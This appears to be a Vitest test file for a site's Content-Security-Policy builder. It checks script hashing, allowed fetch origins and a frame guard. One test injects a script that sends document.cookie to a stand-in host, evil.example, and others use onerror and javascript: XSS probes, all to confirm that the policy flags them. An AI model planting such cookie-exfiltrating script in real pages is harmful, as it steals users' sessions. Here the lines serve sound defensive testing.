import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { describe, expect, it } from "vitest";
import { buildCsp, connectOrigins, cspProblems, inlineScripts, parseCsp, readCsp, scriptHash, withCsp, type CspConfig } from "./csp";

const ROOT = join(__dirname, "..", "..");
const OUT = join(ROOT, "out");

const cfg: CspConfig = {
  apiUrl: "https://vvake-api.simon-54e.workers.dev",
  rpcUrl: "https://rpc.testnet.chain.robinhood.com",
  waitlistEndpoint: "",
  liveEndpoint: "",
  turnstileSiteKey: "",
};

const page = (body: string) =>
  `<!DOCTYPE html><html><head><meta charSet="utf-8"/><script>document.documentElement.dataset.t="x"</script></head><body>${body}<script>self.__next_f.push([1,"a"])</script><script type="application/ld+json">{"@type":"Thing"}</script><script src="/_next/static/a.js" async=""></script></body></html>`;

describe("VV-12 Content-Security-Policy", () => {
  it("VV-12 a page without the policy is reported", () => {
    expect(cspProblems(page(""), cfg)).toEqual(["no Content-Security-Policy meta"]);
  });

  it("VV-12 the policy allows exactly the page's inline scripts, first thing in <head>", () => {
    const html = withCsp(page(""), cfg);
    expect(cspProblems(html, cfg)).toEqual([]);
    expect(html.indexOf("Content-Security-Policy")).toBeLessThan(html.indexOf("<script"));
    const d = parseCsp(readCsp(html)!);
    expect(d["script-src"]).toEqual(
      ["'self'", scriptHash('document.documentElement.dataset.t="x"'), scriptHash('self.__next_f.push([1,"a"])')].sort((a, b) =>
        a === "'self'" ? -1 : b === "'self'" ? 1 : a.localeCompare(b),
      ),
    );
    expect(d["default-src"]).toEqual(["'self'"]);
    expect(d["object-src"]).toEqual(["'none'"]);
    expect(d["base-uri"]).toEqual(["'none'"]);
    expect(d["form-action"]).toEqual(["'self'"]);
    expect(d["img-src"]).toEqual(["'self'", "data:"]);
    expect(d["connect-src"]).toEqual(["'self'", cfg.apiUrl, cfg.rpcUrl]);
    expect(d["frame-src"]).toEqual(["'none'"]);
  });

  it("VV-12 an injected or changed inline script is not covered", () => {
    const html = withCsp(page(""), cfg).replace("</body>", "<script>fetch('https://evil.example/'+document.cookie)</script></body>");
    expect(cspProblems(html, cfg).some((p) => p.startsWith("inline script not allowed"))).toBe(true);
  });

  it("VV-12 inline event handlers and javascript: URLs are reported", () => {
    expect(cspProblems(withCsp(page('<img src="x" onerror="alert(1)">'), cfg), cfg)).toEqual([
      expect.stringContaining("inline event handler"),
    ]);
    expect(cspProblems(withCsp(page('<a href="javascript:alert(1)">x</a>'), cfg), cfg)).toEqual(["javascript: URL"]);
  });

  it("VV-12 JSON-LD and external scripts are not hashed", () => {
    expect(inlineScripts(page(""))).toEqual(['document.documentElement.dataset.t="x"', 'self.__next_f.push([1,"a"])']);
  });

  it("VV-12 waitlist, live feed and Turnstile are allowed only when the build has them", () => {
    const full = { ...cfg, waitlistEndpoint: "https://w.example.dev/", liveEndpoint: "https://l.example.dev", turnstileSiteKey: "k" };
    const d = parseCsp(buildCsp([], full));
    expect(d["connect-src"]).toEqual(["'self'", cfg.apiUrl, cfg.rpcUrl, "https://w.example.dev", "https://l.example.dev"]);
    expect(d["script-src"]).toEqual(["'self'", "https://challenges.cloudflare.com"]);
    expect(d["frame-src"]).toEqual(["https://challenges.cloudflare.com"]);
  });

  /**
   * Every fetch() in the site's code, and where its URL comes from. A new fetch call fails this test until its
   * origin is mapped here, so connect-src can't silently fall behind the code.
   */
  it("VV-12 every origin the code fetches is in connect-src", () => {
    const sources: Record<string, (c: CspConfig) => string | null> = {
      "src/lib/rewardsApi.ts": (c) => c.apiUrl,
      "src/components/sections/ChallengeInvite.tsx": (c) => c.apiUrl,
      "src/lib/chain.ts": (c) => c.rpcUrl,
      "src/lib/waitlist.ts": (c) => c.waitlistEndpoint || null,
      "src/components/sections/LiveMap.tsx": (c) => c.liveEndpoint || null,
      // Dev-only: localhost render server, only tried when the page itself runs on localhost (next dev).
      "src/components/vvaker/PersonaBuilder.tsx": () => null,
    };
    const files = (dir: string): string[] =>
      readdirSync(dir).flatMap((n) => {
        const p = join(dir, n);
        return statSync(p).isDirectory() ? files(p) : /\.(ts|tsx)$/.test(n) && !n.endsWith(".test.ts") ? [p] : [];
      });
    const fetching = files(join(ROOT, "src"))
      .filter((f) => /\bfetch(Impl)?\(/.test(readFileSync(f, "utf8")))
      .map((f) => relative(ROOT, f));
    expect(fetching.sort()).toEqual(Object.keys(sources).sort());
    const live = { ...cfg, waitlistEndpoint: "https://vvake-waitlist.simon-54e.workers.dev", liveEndpoint: "https://l.example.dev" };
    const allowed = parseCsp(buildCsp([], live))["connect-src"]!;
    for (const [file, url] of Object.entries(sources)) {
      const u = url(live);
      if (u) expect(allowed, file).toContain(new URL(u).origin);
    }
    expect(connectOrigins()).toContain("https://vvake-api.simon-54e.workers.dev");
    expect(connectOrigins()).toContain("https://rpc.testnet.chain.robinhood.com");
  });
});

function htmlFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((name) => {
    const p = join(dir, name);
    return statSync(p).isDirectory() ? htmlFiles(p) : name.endsWith(".html") ? [p] : [];
  });
}

describe.skipIf(!existsSync(OUT))("VV-12 built site (out/)", () => {
  it("VV-12 every exported HTML file has a complete CSP covering all its inline scripts and fetch origins", () => {
    const files = htmlFiles(OUT);
    expect(files.length).toBeGreaterThan(0);
    const bad = files.map((f) => [relative(OUT, f), cspProblems(readFileSync(f, "utf8"))] as const).filter(([, p]) => p.length);
    expect(bad).toEqual([]);
  });

  it("VV-12 /en/rewards/ and /fr/rewards/ carry the frame guard", () => {
    for (const lang of ["en", "fr"]) {
      const html = readFileSync(join(OUT, lang, "rewards", "index.html"), "utf8");
      expect(html).toContain("data-frame-guard");
      expect(html).toContain("data-frame-notice");
      expect(html).toContain("window.top===window.self");
    }
  });
});
